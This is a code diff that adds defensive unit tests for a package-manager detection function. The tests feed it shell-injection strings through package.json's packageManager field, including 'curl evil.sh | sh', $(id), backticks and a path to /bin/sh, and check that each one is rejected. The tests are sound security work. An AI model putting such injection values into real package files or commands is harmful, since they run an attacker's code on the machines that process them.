@@ -127,6 +127,45 @@ describe('detectPackageManager', () => {
 
     expect(detectPackageManager(root)).toBe('npm');
   });
+
+  // The result is interpolated into a shell command, so a hostile
+  // package.json must never be able to steer it. Anything unrecognised is
+  // ignored and detection falls through to the lockfiles.
+  it.each([
+    'x; touch /tmp/pwned ;@1.0.0',
+    'npm && curl evil.sh | sh@1',
+    'npm$(id)@1',
+    '`id`@1',
+    'npm|tee /tmp/x@1',
+    '../../../bin/sh@1'
+  ])('refuses to return an injected packageManager (%j)', async declared => {
+    const root = await makeTree({
+      'package.json': { name: 'app', packageManager: declared },
+      'yarn.lock': ''
+    });
+
+    const detected = detectPackageManager(root);
+
+    expect(['npm', 'pnpm', 'yarn', 'bun']).toContain(detected);
+    expect(detected).toBe('yarn'); // fell through to the lockfile
+  });
+
+  it('ignores an unknown-but-harmless packageManager', async () => {
+    const root = await makeTree({
+      'package.json': { name: 'app', packageManager: 'deno@2.0.0' },
+      'pnpm-lock.yaml': ''
+    });
+
+    expect(detectPackageManager(root)).toBe('pnpm');
+  });
+
+  it('accepts the supported managers case-insensitively', async () => {
+    const root = await makeTree({
+      'package.json': { name: 'app', packageManager: 'PNPM@9.0.0' }
+    });
+
+    expect(detectPackageManager(root)).toBe('pnpm');
+  });
 });
 
 describe('isSelfReferential', () => {
